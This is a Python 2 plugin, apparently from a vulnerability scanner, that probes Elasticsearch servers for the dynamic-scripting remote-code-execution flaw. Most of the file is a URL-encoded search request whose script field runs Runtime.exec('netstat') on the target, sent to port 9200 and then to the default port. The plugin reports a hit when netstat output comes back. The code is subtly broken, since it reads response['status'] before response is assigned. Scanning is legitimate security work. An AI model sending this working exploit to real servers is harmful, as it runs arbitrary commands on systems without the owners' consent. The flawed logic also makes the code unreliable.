#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u""
        detail = detail.encode('utf8')
    
        url = "%s://%s:9200/" % (ob['scheme'],ob['domain'])
        url += "_search?source={%22size%22:1,%22query%22:{%22filtered%22:{%22query%22:{%22match_all%22:{}}}},%22script_fields%22:{%22exp%22:{%22script%22:%22import%20java.util.*;\nimport%20java.io.*;\nString%20str%20=%20\%22\%22;BufferedReader%20br%20=%20new%20BufferedReader(new%20InputStreamReader(Runtime.getRuntime().exec(\%22netstat\%22).getInputStream()));StringBuilder%20sb%20=%20new%20StringBuilder();while((str=br.readLine())!=null){sb.append(str%2b%5C%22%5Cr%5Cn%5C%22);}sb.toString();%22}}}"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if (content.find("ESTABLISHED")>=0 or content.find("TIME_WAIT")>=0 or content.find("LISTENING")>=0 or content.find("LISTEN")>=0)and content.lower().find("</html>")<0 and response['status']=='200':
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
        else:
            url = "%s://%s" % (ob['scheme'],domain)
            url += "/_search?source={%22size%22:1,%22query%22:{%22filtered%22:{%22query%22:{%22match_all%22:{}}}},%22script_fields%22:{%22exp%22:{%22script%22:%22import%20java.util.*;\nimport%20java.io.*;\nString%20str%20=%20\%22\%22;BufferedReader%20br%20=%20new%20BufferedReader(new%20InputStreamReader(Runtime.getRuntime().exec(\%22netstat\%22).getInputStream()));StringBuilder%20sb%20=%20new%20StringBuilder();while((str=br.readLine())!=null){sb.append(str%2b%5C%22%5Cr%5Cn%5C%22);}sb.toString();%22}}}"
            res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
            if (content.find("ESTABLISHED")>=0 or content.find("TIME_WAIT")>=0 or content.find("LISTENING")>=0 or content.find("LISTEN")>=0)and content.lower().find("</html>")<0 and response['status']=='200':
                request = getRequest(url)
                response = getResponse(res)
                list.append(getRecord(ob,url,ob['level'],detail,request,response))
            #end if
        #end if
    except Exception,e:
        logging.getLogger().error("File:elasticsearchcmsscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:elasticsearchcmsscript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def




            
        
        
        
        
        







